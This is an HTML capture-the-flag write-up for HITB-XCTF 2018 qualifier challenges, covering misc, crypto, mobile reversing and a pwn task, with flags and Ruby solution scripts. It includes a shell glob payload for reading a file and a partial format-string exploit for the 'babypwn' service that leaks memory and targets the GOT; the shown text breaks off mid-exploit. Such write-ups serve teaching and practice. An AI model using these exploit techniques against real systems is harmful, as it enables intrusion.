@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>HITB-XCTF 2018 Quals Writeup (scryptos)</title>
+    <style type="text/css">
+    html{font-family: sans-serif;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%}body{margin: 0}article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section,summary{display: block}audio,canvas,progress,video{display: inline-block;vertical-align: baseline}audio:not([controls]){display: none;height: 0}[hidden],template{display: none}a{background: transparent}a:active,a:hover{outline: 0}abbr[title]{border-bottom: 1px dotted}b,strong{font-weight: bold}dfn{font-style: italic}h1{font-size: 2em;margin: 0.67em 0}mark{background: #ff0;color: #000}small{font-size: 80%}sub,sup{font-size: 75%;line-height: 0;position: relative;vertical-align: baseline}sup{top: -0.5em}sub{bottom: -0.25em}img{border: 0}svg:not(:root){overflow: hidden}figure{margin: 1em 40px}hr{box-sizing: content-box;height: 0}pre{overflow: auto}code,kbd,pre,samp{font-family: monospace, monospace;font-size: 1em}button,input,optgroup,select,textarea{color: inherit;font: inherit;margin: 0}button{overflow: visible}button,select{text-transform: none}button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance: button;cursor: pointer}button[disabled],html input[disabled]{cursor: default}button::-moz-focus-inner,input::-moz-focus-inner{border: 0;padding: 0}input{line-height: normal}input[type="checkbox"],input[type="radio"]{box-sizing: border-box;padding: 0}input[type="number"]::-webkit-inner-spin-button,input[type="number"]::-webkit-outer-spin-button{height: auto}input[type="search"]{-webkit-appearance: textfield;box-sizing: content-box}input[type="search"]::-webkit-search-cancel-button,input[type="search"]::-webkit-search-decoration{-webkit-appearance: none}fieldset{border: 1px solid #c0c0c0;margin: 0 2px;padding: 0.35em 0.625em 0.75em}legend{border: 0;padding: 0}textarea{overflow: auto}optgroup{font-weight: bold}table{border-collapse: collapse;border-spacing: 0}td,th{padding: 0}*{box-sizing: border-box}input,select,textarea,button{font: 13px/1.4 Helvetica, arial, freesans, clean, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"}body{min-width: 1020px;font: 13px/1.4 Helvetica, arial, freesans, clean, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";color: #333;background-color: #fff}a{color: #4183c4;text-decoration: none}a:hover,a:active{text-decoration: underline}hr,.rule{height: 0;margin: 15px 0;overflow: hidden;background: transparent;border: 0;border-bottom: 1px solid #ddd}hr:before,.rule:before{display: table;content: ""}hr:after,.rule:after{display: table;clear: both;content: ""}h1,h2,h3,h4,h5,h6{margin-top: 15px;margin-bottom: 15px;line-height: 1.1}h1{font-size: 30px}h2{font-size: 21px}h3{font-size: 16px}h4{font-size: 14px}h5{font-size: 12px}h6{font-size: 11px}small{font-size: 90%}blockquote{margin: 0}.lead{margin-bottom: 30px;font-size: 20px;font-weight: 300;color: #555}.text-muted{color: #999}.text-danger{color: #bd2c00}.text-emphasized{font-weight: bold;color: #333}ul,ol{padding: 0;margin-top: 0;margin-bottom: 0}ol ol,ul ol{list-style-type: lower-roman}ul ul ol,ul ol ol,ol ul ol,ol ol ol{list-style-type: lower-alpha}dd{margin-left: 0}tt,code{font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;font-size: 12px}pre{margin-top: 0;margin-bottom: 0;font: 12px Consolas, "Liberation Mono", Menlo, Courier, monospace}#realtime .status{overflow: visible;position: absolute;top: -5px;left: 0;background: url("/public/images/github-status.png");width: 26px;height: 26px;display: block;margin: 0 5px 0 0}#realtime .up{background-position: 0 0}#realtime .problem{background-position: 0 -53px}#realtime .down{background-position: 0 -26px}.container{max-width: 920px;margin: 0 auto 20px auto}#header{background: #FAFAFA;background: -moz-linear-gradient(#FAFAFA, #EAEAEA);background: -webkit-linear-gradient(#FAFAFA, #EAEAEA);-ms-filter: "progid:DXImageTransform.Microsoft.gradient(startColorstr='#fafafa', endColorstr='#eaeaea')";border-bottom: 1px solid #CACACA;box-shadow: 0 1px 0 rgba(255, 255, 255, 0.4),0 0 10px rgba(0, 0, 0, 0.1)}#markup{padding: 3px}#markup article{padding-top: 30px}.markdown-body{overflow: hidden;font-family: "Helvetica Neue", Helvetica, "Segoe UI", Arial, freesans, sans-serif;font-size: 16px;line-height: 1.6;word-wrap: break-word}.markdown-body>*:first-child{margin-top: 0 !important}.markdown-body>*:last-child{margin-bottom: 0 !important}.markdown-body .absent{color: #c00}.markdown-body .anchor{position: absolute;top: 0;left: 0;display: block;padding-right: 6px;padding-left: 30px;margin-left: -30px}.markdown-body .anchor:focus{outline: none}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position: relative;margin-top: 1em;margin-bottom: 16px;font-weight: bold;line-height: 1.4}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{display: none;color: #000;vertical-align: middle}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{padding-left: 8px;margin-left: -30px;text-decoration: none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{display: inline-block}.markdown-body h1 tt,.markdown-body h1 code,.markdown-body h2 tt,.markdown-body h2 code,.markdown-body h3 tt,.markdown-body h3 code,.markdown-body h4 tt,.markdown-body h4 code,.markdown-body h5 tt,.markdown-body h5 code,.markdown-body h6 tt,.markdown-body h6 code{font-size: inherit}.markdown-body h1{padding-bottom: 0.3em;font-size: 2.25em;line-height: 1.2;border-bottom: 1px solid #eee}.markdown-body h1 .anchor{line-height: 1}.markdown-body h2{padding-bottom: 0.3em;font-size: 1.75em;line-height: 1.225;border-bottom: 1px solid #eee}.markdown-body h2 .anchor{line-height: 1}.markdown-body h3{font-size: 1.5em;line-height: 1.43}.markdown-body h3 .anchor{line-height: 1.2}.markdown-body h4{font-size: 1.25em}.markdown-body h4 .anchor{line-height: 1.2}.markdown-body h5{font-size: 1em}.markdown-body h5 .anchor{line-height: 1.1}.markdown-body h6{font-size: 1em;color: #777}.markdown-body h6 .anchor{line-height: 1.1}.markdown-body p,.markdown-body blockquote,.markdown-body ul,.markdown-body ol,.markdown-body dl,.markdown-body table,.markdown-body pre{margin-top: 0;margin-bottom: 16px}.markdown-body hr{height: 4px;padding: 0;margin: 16px 0;background-color: #e7e7e7;border: 0 none}.markdown-body ul,.markdown-body ol{padding-left: 2em}.markdown-body ul.no-list,.markdown-body ol.no-list{padding: 0;list-style-type: none}.markdown-body ul ul,.markdown-body ul ol,.markdown-body ol ol,.markdown-body ol ul{margin-top: 0;margin-bottom: 0}.markdown-body li>p{margin-top: 16px}.markdown-body dl{padding: 0}.markdown-body dl dt{padding: 0;margin-top: 16px;font-size: 1em;font-style: italic;font-weight: bold}.markdown-body dl dd{padding: 0 16px;margin-bottom: 16px}.markdown-body blockquote{padding: 0 15px;color: #777;border-left: 4px solid #ddd}.markdown-body blockquote>:first-child{margin-top: 0}.markdown-body blockquote>:last-child{margin-bottom: 0}.markdown-body table{display: block;width: 100%;overflow: auto;word-break: normal;word-break: keep-all}.markdown-body table th{font-weight: bold}.markdown-body table th,.markdown-body table td{padding: 6px 13px;border: 1px solid #ddd}.markdown-body table tr{background-color: #fff;border-top: 1px solid #ccc}.markdown-body table tr:nth-child(2n){background-color: #f8f8f8}.markdown-body img{max-width: 100%;box-sizing: border-box}.markdown-body span.frame{display: block;overflow: hidden}.markdown-body span.frame>span{display: block;float: left;width: auto;padding: 7px;margin: 13px 0 0;overflow: hidden;border: 1px solid #ddd}.markdown-body span.frame span img{display: block;float: left}.markdown-body span.frame span span{display: block;padding: 5px 0 0;clear: both;color: #333}.markdown-body span.align-center{display: block;overflow: hidden;clear: both}.markdown-body span.align-center>span{display: block;margin: 13px auto 0;overflow: hidden;text-align: center}.markdown-body span.align-center span img{margin: 0 auto;text-align: center}.markdown-body span.align-right{display: block;overflow: hidden;clear: both}.markdown-body span.align-right>span{display: block;margin: 13px 0 0;overflow: hidden;text-align: right}.markdown-body span.align-right span img{margin: 0;text-align: right}.markdown-body span.float-left{display: block;float: left;margin-right: 13px;overflow: hidden}.markdown-body span.float-left span{margin: 13px 0 0}.markdown-body span.float-right{display: block;float: right;margin-left: 13px;overflow: hidden}.markdown-body span.float-right>span{display: block;margin: 13px auto 0;overflow: hidden;text-align: right}.markdown-body code,.markdown-body tt{padding: 0;padding-top: 0.2em;padding-bottom: 0.2em;margin: 0;font-size: 85%;background-color: rgba(0,0,0,0.04);border-radius: 3px}.markdown-body code:before,.markdown-body code:after,.markdown-body tt:before,.markdown-body tt:after{letter-spacing: -0.2em;content: "\00a0"}.markdown-body code br,.markdown-body tt br{display: none}.markdown-body del code{text-decoration: inherit}.markdown-body pre>code{padding: 0;margin: 0;font-size: 100%;word-break: normal;white-space: pre;background: transparent;border: 0}.markdown-body .highlight{margin-bottom: 16px}.markdown-body .highlight pre,.markdown-body pre{padding: 16px;overflow: auto;font-size: 85%;line-height: 1.45;background-color: #f7f7f7;border-radius: 3px}.markdown-body .highlight pre{margin-bottom: 0;word-break: normal}.markdown-body pre{word-wrap: normal}.markdown-body pre code,.markdown-body pre tt{display: inline;max-width: initial;padding: 0;margin: 0;overflow: initial;line-height: inherit;word-wrap: normal;background-color: transparent;border: 0}.markdown-body pre code:before,.markdown-body pre code:after,.markdown-body pre tt:before,.markdown-body pre tt:after{content: normal}.markdown-body kbd{display: inline-block;padding: 3px 5px;font-size: 11px;line-height: 10px;color: #555;vertical-align: middle;background-color: #fcfcfc;border: solid 1px #ccc;border-bottom-color: #bbb;border-radius: 3px;box-shadow: inset 0 -1px 0 #bbb}.codehilite{background: #ffffff}.codehilite .c{color: #999988;font-style: italic}.codehilite .err{color: #a61717;background-color: #e3d2d2}.codehilite .k{color: #000000;font-weight: bold}.codehilite .o{color: #000000;font-weight: bold}.codehilite .cm{color: #999988;font-style: italic}.codehilite .cp{color: #999999;font-weight: bold}.codehilite .c1{color: #999988;font-style: italic}.codehilite .cs{color: #999999;font-weight: bold;font-style: italic}.codehilite .gd{color: #000000;background-color: #ffdddd}.codehilite .gd .x{color: #000000;background-color: #ffaaaa}.codehilite .ge{color: #000000;font-style: italic}.codehilite .gr{color: #aa0000}.codehilite .gh{color: #999999}.codehilite .gi{color: #000000;background-color: #ddffdd}.codehilite .gi .x{color: #000000;background-color: #aaffaa}.codehilite .go{color: #888888}.codehilite .gp{color: #555555}.codehilite .gs{font-weight: bold}.codehilite .gu{color: #aaaaaa}.codehilite .gt{color: #aa0000}.codehilite .kc{color: #000000;font-weight: bold}.codehilite .kd{color: #000000;font-weight: bold}.codehilite .kp{color: #000000;font-weight: bold}.codehilite .kr{color: #000000;font-weight: bold}.codehilite .kt{color: #445588;font-weight: bold}.codehilite .m{color: #009999}.codehilite .s{color: #d14}.codehilite .na{color: #008080}.codehilite .nb{color: #0086B3}.codehilite .nc{color: #445588;font-weight: bold}.codehilite .no{color: #008080}.codehilite .ni{color: #800080}.codehilite .ne{color: #990000;font-weight: bold}.codehilite .nf{color: #990000;font-weight: bold}.codehilite .nn{color: #555555}.codehilite .nt{color: #000080}.codehilite .nv{color: #008080}.codehilite .ow{color: #000000;font-weight: bold}.codehilite .w{color: #bbbbbb}.codehilite .mf{color: #009999}.codehilite .mh{color: #009999}.codehilite .mi{color: #009999}.codehilite .mo{color: #009999}.codehilite .sb{color: #d14}.codehilite .sc{color: #d14}.codehilite .sd{color: #d14}.codehilite .s2{color: #d14}.codehilite .se{color: #d14}.codehilite .sh{color: #d14}.codehilite .si{color: #d14}.codehilite .sx{color: #d14}.codehilite .sr{color: #009926}.codehilite .s1{color: #d14}.codehilite .ss{color: #990073}.codehilite .bp{color: #999999}.codehilite .vc{color: #008080}.codehilite .vg{color: #008080}.codehilite .vi{color: #008080}.codehilite .il{color: #009999}
+    </style>
+    <style type="text/css">
+      .markdown-body hr{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAYAAAAECAYAAACtBE5DAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBNYWNpbnRvc2giIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6OENDRjNBN0E2NTZBMTFFMEI3QjRBODM4NzJDMjlGNDgiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6OENDRjNBN0I2NTZBMTFFMEI3QjRBODM4NzJDMjlGNDgiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo4Q0NGM0E3ODY1NkExMUUwQjdCNEE4Mzg3MkMyOUY0OCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo4Q0NGM0E3OTY1NkExMUUwQjdCNEE4Mzg3MkMyOUY0OCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqqezsUAAAAfSURBVHjaYmRABcYwBiM2QSA4y4hNEKYDQxAEAAIMAHNGAzhkPOlYAAAAAElFTkSuQmCC")}
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div id="markup">
+        <article id="content" class="markdown-body">
+          <h1>HITB-XCTF 2018 Quals Writeup (scryptos)</h1>
+<h2>IRC checkin (Misc 59pts)</h2>
+<div class="codehilite"><pre><span class="k">goto</span> <span class="n">IRC</span>
+</pre></div>
+
+
+<p>flag: <code>HITBXCTF{W3lcome_To_HITBXCTF_2018_Online_Qualifications}</code></p>
+<h2>readfile (Misc 266pts)</h2>
+<div class="codehilite"><pre>$()$(&lt;/????/????_??_????/????.???)
+</pre></div>
+
+
+<p>flag: <code>HITB{d7dc2f3c59291946abc768d74367ec31}</code></p>
+<h2>base (Crypto 289pts)</h2>
+<p>By looking closely at bin data received from the server, you can guess that the input is encoded in a similar way to Base64.<br>
+Try all the pairs of the first two character of the flag and choose one with longest lcp, and there you go.</p>
+<p>Solution script: <a href="https://gist.github.com/193s/8d1bd57109b1807e266cb5df3206940c">https://gist.github.com/193s/8d1bd57109b1807e266cb5df3206940c</a></p>
+<p>flag: <code>HITB{5869616f6d6f40466c61707079506967}</code></p>
+<h2>multicheck (Mobile 333pts)</h2>
+<p>The apk does:</p>
+<ol>
+<li>Save a file named claz.dex</li>
+<li>Load claz.dex via <code>DexClassLoader</code></li>
+<li>When the button is clicked, call <code>com.a.Check</code></li>
+</ol>
+<p>The apk includes a file named "claz.dex", but it only contains a fake flag :(</p>
+<p>After investigating other files, I noticed that the file named "libcheck.so" contains the real claz.dex.</p>
+<p>I wrote a script to extract real claz.dex from libcheck.so.</p>
+<div class="codehilite"><pre><span class="c1">#coding:ascii-8bit</span>
+
+<span class="n">b</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;libcheck.so&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="o">[</span><span class="mh">0x3004</span><span class="o">...</span><span class="mh">0x3004</span> <span class="o">+</span> <span class="mi">1852</span><span class="o">]</span>
+
+<span class="n">x</span> <span class="o">=</span> <span class="mi">233</span>
+<span class="mi">1852</span><span class="o">.</span><span class="n">times</span><span class="p">{</span><span class="o">|</span><span class="n">i</span><span class="o">|</span>
+  <span class="n">b</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="n">ord</span> <span class="o">^</span> <span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">chr</span>
+  <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
+<span class="p">}</span>
+<span class="nb">open</span><span class="p">(</span><span class="s2">&quot;claz.dex&quot;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">){</span><span class="o">|</span><span class="n">f</span><span class="o">|</span> <span class="n">f</span><span class="o">.</span><span class="n">write</span> <span class="n">b</span><span class="p">}</span>
+</pre></div>
+
+
+<p>I reversed the real claz.dex and found out how it verifies the flag.</p>
+<p>Solution script:</p>
+<div class="codehilite"><pre><span class="c1">#coding:ascii-8bit</span>
+
+<span class="vi">@b</span> <span class="o">=</span> <span class="o">[</span><span class="mi">99</span><span class="p">,</span> <span class="mi">124</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">233</span><span class="p">,</span> <span class="mi">142</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">209</span><span class="p">,</span> <span class="mi">217</span><span class="p">,</span> <span class="mi">154</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">217</span><span class="p">,</span> <span class="mi">162</span><span class="p">,</span> <span class="mi">190</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">229</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">251</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">236</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">237</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">181</span><span class="o">]</span>
+
+<span class="k">class</span> <span class="nc">Fixnum</span>
+  <span class="k">def</span> <span class="nf">int</span>
+    <span class="o">[</span><span class="nb">self</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;L&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;l&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">reverse</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+  <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="vi">@b</span><span class="o">[</span><span class="n">a</span><span class="o">...</span><span class="n">a</span> <span class="o">+</span> <span class="mi">8</span><span class="o">].</span><span class="n">map</span><span class="p">(</span><span class="o">&amp;</span><span class="ss">:chr</span><span class="p">)</span><span class="o">.</span><span class="n">join</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;L&gt;*&quot;</span><span class="p">)</span>
+  <span class="n">k</span> <span class="o">=</span> <span class="mh">0xc6ef3720</span><span class="o">.</span><span class="n">int</span>
+  <span class="mi">32</span><span class="o">.</span><span class="n">times</span><span class="p">{</span>
+    <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">-</span> <span class="p">((</span><span class="o">-</span><span class="mi">269488145</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">int</span><span class="p">)</span><span class="o">.</span><span class="n">int</span> <span class="o">^</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">k</span><span class="p">)</span><span class="o">.</span><span class="n">int</span> <span class="o">^</span> <span class="p">(</span><span class="mi">305419896</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">int</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">))</span><span class="o">.</span><span class="n">int</span><span class="p">))</span><span class="o">.</span><span class="n">int</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="p">((</span><span class="o">-</span><span class="mi">1414812757</span> <span class="o">+</span> <span class="p">(</span><span class="n">j</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">int</span><span class="p">)</span><span class="o">.</span><span class="n">int</span> <span class="o">^</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">k</span><span class="p">)</span><span class="o">.</span><span class="n">int</span> <span class="o">^</span> <span class="p">(</span><span class="o">-</span><span class="mi">842150451</span> <span class="o">+</span> <span class="p">(</span><span class="n">j</span><span class="o">.</span><span class="n">int</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">))))</span><span class="o">.</span><span class="n">int</span>
+    <span class="n">k</span> <span class="o">=</span> <span class="p">(</span><span class="n">k</span> <span class="o">+</span> <span class="mh">0x61c88647</span><span class="p">)</span><span class="o">.</span><span class="n">int</span>
+  <span class="p">}</span>
+  <span class="o">[</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;L&gt;*&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">bytes</span>
+<span class="k">end</span>
+
+<span class="nb">p</span> <span class="mi">4</span><span class="o">.</span><span class="n">times</span><span class="o">.</span><span class="n">map</span><span class="p">{</span><span class="o">|</span><span class="n">i</span><span class="o">|</span> <span class="n">reverse</span><span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)}</span><span class="o">.</span><span class="n">flatten</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="o">&amp;</span><span class="ss">:chr</span><span class="p">)</span><span class="o">.</span><span class="n">join</span>
+<span class="c1"># =&gt; &quot;\x04\x00\x00\x00HITB{SEe!N9_IsN&#39;T_bELIEV1Ng}&quot;</span>
+</pre></div>
+
+
+<p>flag: <code>HITB{SEe!N9_IsN'T_bELIEV1Ng}</code></p>
+<h2>kivy simple (Mobile 384pts)</h2>
+<p>The apk contains a file named "private.mp3", which is actually a tar ball.</p>
+<p>After decompressing private.mp3, I found a file named "main.pyo".  </p>
+<p>I decompiled main.pyo with <a href="https://github.com/wibiti/uncompyle2">uncompyle2</a> and found the flag.</p>
+<p>flag: <code>HITB{1!F3_1S_&amp;H%r7_v$3_pY7#ON!}</code></p>
+<h2>babypwn (Pwn 253pts)</h2>
+<p>pwn + no binary given + an echo service = format string stuff</p>
+<p>First I dumped the binary using format string attack.</p>
+<p>The <code>main</code> function was quite simple:</p>
+<div class="codehilite"><pre><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+        <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+        <span class="n">usleep</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>Since the binary has Partial RELRO, it's easy to control RIP by overwriting GOT.</p>
+<p>Exploit:</p>
+<div class="codehilite"><pre><span class="c1">#coding:ascii-8bit</span>
+<span class="nb">require</span> <span class="s2">&quot;pwnlib&quot;</span>  <span class="c1"># https://github.com/Charo-IT/pwnlib</span>
+
+<span class="n">remote</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span>
+<span class="k">if</span> <span class="n">remote</span>
+  <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;47.75.182.113&quot;</span>
+  <span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
+  <span class="n">libc_offset</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;usleep&quot;</span> <span class="o">=&gt;</span> <span class="mh">0xfdd60</span><span class="p">,</span>
+    <span class="s2">&quot;one_gadget&quot;</span> <span class="o">=&gt;</span> <span class="mh">0xf1147</span>
+  <span class="p">}</span>
+<span class="k">else</span>
+  <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;localhost&quot;</span>
+  <span class="n">port</span> <span class="o">=</span> <span class="mi">54321</span>
+  <span class="n">libc_offset</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;usleep&quot;</span> <span class="o">=&gt;</span> <span class="mh">0xfdd60</span><span class="p">,</span>
+    <span class="s2">&quot;one_gadget&quot;</span> <span class="o">=&gt;</span> <span class="mh">0xf1147</span>
+  <span class="p">}</span>
+<span class="k">end</span>
+
+<span class="n">got</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="s2">&quot;usleep&quot;</span> <span class="o">=&gt;</span> <span class="mh">0x601030</span>
+<span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">tube</span>
+  <span class="vi">@tube</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+  <span class="k">if</span> <span class="o">[</span><span class="n">addr</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">include?</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s2">&quot;&quot;</span>
+  <span class="k">end</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;%8$s114514&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="o">[</span><span class="n">addr</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">))</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">recv_capture</span><span class="p">(</span><span class="sr">/(.*?)114514/m</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">leak_range</span><span class="p">(</span><span class="n">from</span><span class="p">,</span> <span class="n">to</span><span class="p">)</span>
+  <span class="n">buf</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="k">while</span> <span class="n">from</span> <span class="o">+</span> <span class="n">buf</span><span class="o">.</span><span class="n">length</span> <span class="o">&lt;</span> <span class="n">to</span>
+    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\r</span><span class="s2">0x%x&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">from</span> <span class="o">+</span> <span class="n">buf</span><span class="o">.</span><span class="n">length</span><span class="p">)</span>
+    <span class="n">buf</span> <span class="o">&lt;&lt;</span> <span class="n">leak</span><span class="p">(</span><span class="n">from</span> <span class="o">+</span> <span class="n">buf</span><span class="o">.</span><span class="n">length</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span>
+  <span class="k">end</span>
+  <span class="n">buf</span>
+<span class="k">end</span>
+
+<span class="no">PwnTube</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">){</span><span class="o">|</span><span class="n">t</span><span class="o">|</span>
+  <span class="vi">@tube</span> <span class="o">=</span> <span class="n">t</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] leak libc base&quot;</span>
